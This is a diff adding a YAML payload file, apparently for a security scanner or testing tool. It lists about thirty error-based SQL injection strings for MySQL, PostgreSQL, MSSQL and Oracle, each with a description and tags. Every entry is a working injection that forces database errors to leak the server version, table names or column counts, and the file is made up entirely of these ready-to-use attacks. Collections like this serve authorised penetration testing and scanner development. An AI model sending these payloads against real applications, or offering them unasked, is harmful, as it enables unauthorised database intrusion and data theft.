@@ -1,0 +1,129 @@
+name: "SQLi Error-Based Payloads"
+description: "SQL injection payloads for error-based data extraction"
+attack_type: "sqli"
+category: "error-based"
+
+payloads:
+  # MySQL error-based
+  - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+    description: "MySQL EXTRACTVALUE error"
+    tags: ["error", "mysql", "extractvalue"]
+
+  - value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
+    description: "MySQL UPDATEXML error"
+    tags: ["error", "mysql", "updatexml"]
+
+  - value: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    description: "MySQL double query error"
+    tags: ["error", "mysql", "double-query"]
+
+  - value: "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a GROUP BY x LIMIT 1)--"
+    description: "MySQL ROW error"
+    tags: ["error", "mysql", "row"]
+
+  - value: "' AND EXP(~(SELECT * FROM (SELECT @@version)x))--"
+    description: "MySQL EXP overflow"
+    tags: ["error", "mysql", "exp"]
+
+  - value: "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
+    description: "MySQL GTID_SUBSET error"
+    tags: ["error", "mysql", "gtid"]
+
+  - value: "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,@@version,0x7e)) USING utf8)))--"
+    description: "MySQL JSON_KEYS error"
+    tags: ["error", "mysql", "json"]
+
+  # PostgreSQL error-based
+  - value: "' AND 1=CAST((SELECT version()) AS INT)--"
+    description: "PostgreSQL CAST error"
+    tags: ["error", "postgresql", "cast"]
+
+  - value: "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--"
+    description: "PostgreSQL table via CAST"
+    tags: ["error", "postgresql", "cast", "extraction"]
+
+  - value: "'||(SELECT ''||version())--"
+    description: "PostgreSQL concatenation error"
+    tags: ["error", "postgresql", "concat"]
+
+  - value: "' AND 1::int=(SELECT version())--"
+    description: "PostgreSQL type cast error"
+    tags: ["error", "postgresql", "typecast"]
+
+  # MSSQL error-based
+  - value: "' AND 1=CONVERT(int,(SELECT @@version))--"
+    description: "MSSQL CONVERT error"
+    tags: ["error", "mssql", "convert"]
+
+  - value: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+    description: "MSSQL table via CONVERT"
+    tags: ["error", "mssql", "convert", "extraction"]
+
+  - value: "' AND 1=(SELECT @@version WHERE 1=CAST(@@version AS INT))--"
+    description: "MSSQL CAST error"
+    tags: ["error", "mssql", "cast"]
+
+  - value: "';DECLARE @v VARCHAR(8000);SET @v=@@version;SELECT @v AS ''--"
+    description: "MSSQL variable error"
+    tags: ["error", "mssql", "variable"]
+
+  # Oracle error-based
+  - value: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--"
+    description: "Oracle UTL_INADDR error"
+    tags: ["error", "oracle", "utl_inaddr"]
+
+  - value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--"
+    description: "Oracle CTXSYS error"
+    tags: ["error", "oracle", "ctxsys"]
+
+  - value: "' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE ROWNUM=1))--"
+    description: "Oracle DBMS_XDB error"
+    tags: ["error", "oracle", "dbms_xdb"]
+
+  - value: "' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)--"
+    description: "Oracle ORDSYS error"
+    tags: ["error", "oracle", "ordsys"]
+
+  - value: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT @@version)||CHR(62))) FROM dual)--"
+    description: "Oracle XMLType error"
+    tags: ["error", "oracle", "xmltype"]
+
+  # Generic error triggers
+  - value: "' AND 1/0--"
+    description: "Division by zero"
+    tags: ["error", "generic", "division"]
+
+  - value: "' AND CAST('x' AS INT)--"
+    description: "Invalid CAST"
+    tags: ["error", "generic", "cast"]
+
+  - value: "' AND 'x'=1--"
+    description: "Type mismatch"
+    tags: ["error", "generic", "type"]
+
+  # Parenthesis variations
+  - value: "') AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+    description: "Paren close error"
+    tags: ["error", "mysql", "parenthesis"]
+
+  - value: "')) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+    description: "Double paren error"
+    tags: ["error", "mysql", "parenthesis"]
+
+  # Numeric context
+  - value: "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))"
+    description: "Numeric error injection"
+    tags: ["error", "mysql", "numeric"]
+
+  # Verbose errors
+  - value: "' HAVING 1=1--"
+    description: "HAVING error (column leak)"
+    tags: ["error", "generic", "having"]
+
+  - value: "' GROUP BY 1--"
+    description: "GROUP BY error"
+    tags: ["error", "generic", "groupby"]
+
+  - value: "' ORDER BY 9999--"
+    description: "ORDER BY error (column count)"
+    tags: ["error", "generic", "orderby"]
